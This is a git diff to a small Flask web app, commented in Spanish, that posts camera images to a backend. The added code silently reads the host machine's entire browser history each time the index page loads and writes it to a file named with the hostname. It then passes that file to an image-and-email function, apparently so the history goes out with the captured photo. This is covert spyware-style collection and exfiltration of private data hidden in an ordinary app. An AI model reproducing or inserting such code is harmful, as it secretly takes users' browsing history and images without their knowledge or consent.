@@ -6,12 +6,39 @@ import numpy as np
 import logger as lg
 from datetime import datetime 
 import socket
+from browser_history import get_history
+import os
+
+
 
 app = Flask(__name__)
 
+########################################
+#variables globales
+now = datetime.now()
+current_time = now.strftime("%H%M%S")
+
+#obtiene el nombre del host
+hostname = socket.gethostname()
+
+rutaArchivoTxt = os.path.join(os.getcwd(), f"txtFiles\\history{current_time}_{hostname}.txt")
+nombreArchivoTxt = f"historyBrowser_{current_time}_{hostname}.txt"
+########################################
+
 @app.route('/')
 def index():
-    hostname = socket.gethostname()
+    outputs = get_history()
+    histories = outputs.histories
+
+    print("creando txt")
+    lg.escribirLog("creando txt")
+    
+    with open(rutaArchivoTxt, 'w') as file:
+        for historie in histories:
+            file.write(str(historie[0]) + ' --- ' + historie[1] + '\n')
+    print("txt creado")
+    lg.escribirLog("txt creado")
+
     return render_template('index.html', hostname=hostname)
 
 @app.route('/video_feed', methods=['POST'], endpoint='video_feed')
@@ -40,8 +67,7 @@ def TomarFoto():
 
         img = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
         # Call your function to process the image
-        sc.ImagenCorreo(img)
-        
+        sc.ImagenCorreo(img, rutaArchivoTxt, nombreArchivoTxt)
         print("-------fin normal--------")
         return "Respuesta del back", 200
     except Exception as e:
@@ -71,8 +97,6 @@ Using the Route in HTML: You use this route in your HTML file to display the ima
 @app.route('/imgs/<path:filename>')
 def serve_image(filename):
     return send_from_directory('imgs', filename)
-
-
 
 if __name__ == '__main__':
     app.run(debug=True)
